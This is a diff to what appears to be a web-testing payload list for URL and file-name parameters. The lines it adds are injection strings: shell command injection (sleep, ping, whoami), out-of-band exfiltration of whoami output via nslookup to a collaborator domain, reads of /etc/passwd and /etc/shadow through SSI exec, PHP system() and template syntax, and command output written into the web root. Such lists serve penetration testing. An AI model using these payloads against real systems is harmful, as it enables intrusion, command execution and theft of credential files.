@@ -20,13 +20,33 @@ https://{domain}/{fileName}.jpg; sleep 10;
 https://{domain}/{fileName}.png; sleep 10;
 https://{domain}/{fileName}.jpg;%20sleep%2010;
 https://{domain}/{fileName}.png;%20sleep%2010;
-https://{domain}/{fileName}; sleep 10;
+https://{domain}/{fileName};sleep 10;
 https://{domain}/{fileName};%20sleep%2010;
-https://{domain}/{fileName}?a=bbb||ping+-c+10+127.0.0.1||
-https://{domain}/{fileName}?a=bbb; sleep 10;
-https://{domain}/{fileName}?a=bbb;%20sleep%2010;
+https://{domain}/{fileName}.png||ping+-c+10+127.0.0.1||
+https://{domain}/{fileName}.png||whoami>/var/www/images/output.txt||
+https://{domain}/{fileName}.png||nslookup+'whoami'.{CollaboratorDomain}
+https://{domain}/{fileName}.png||nslookup+'whoami'.{CollaboratorDomain}||.png
+https://{domain}/{fileName}.png?a=bbb||ping+-c+10+127.0.0.1||
+https://{domain}/{fileName}.png?a=bbb; sleep 10;
+https://{domain}/{fileName}.png?a=bbb;%20sleep%2010;
 https://sleep(10)-- -.jpg
-; sleep 10;
+
+
+https://{domain}/{fileName}.png;cat /etc/hosts
+https://{domain}/{fileName}.png;$(`cat /etc/passwd`)
+https://{domain}/{fileName}.png;cat /etc/passwd
+https://{domain}/{fileName}.png;%0Acat%20/etc/passwd
+https://{domain}/{fileName}.png;{{ get_user_file("/etc/passwd") }}
+https://{domain}/{fileName}.png;<!--#exec cmd="/bin/cat /etc/passwd"-->
+https://{domain}/{fileName}.png;<!--#exec cmd="/bin/cat /etc/shadow"-->
+https://{domain}/{fileName}.png;<!--#exec cmd="/usr/bin/id;-->
+https://{domain}/{fileName}.png;system('cat /etc/passwd');
+https://{domain}/{fileName}.png;<?php system("cat /etc/passwd");?>
+https://{domain}/{fileName}.png;system('cat%20/etc/passwd')
+https://{domain}/{fileName}.png;system('id')
+https://{domain}/{fileName}.png;system('/usr/bin/id')
+
+
 
 
 -- --------------
@@ -108,6 +128,8 @@ https://{domain}/>{fileName}.jpg
 https://{domain}/*{fileName}.jpg
 https://{domain}/?{fileName}.jpg
 https://{domain}/"{fileName}.jpg
+
+
 
 -- Long file payloads
 https://{domain}/"{fileName}eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee.jpg
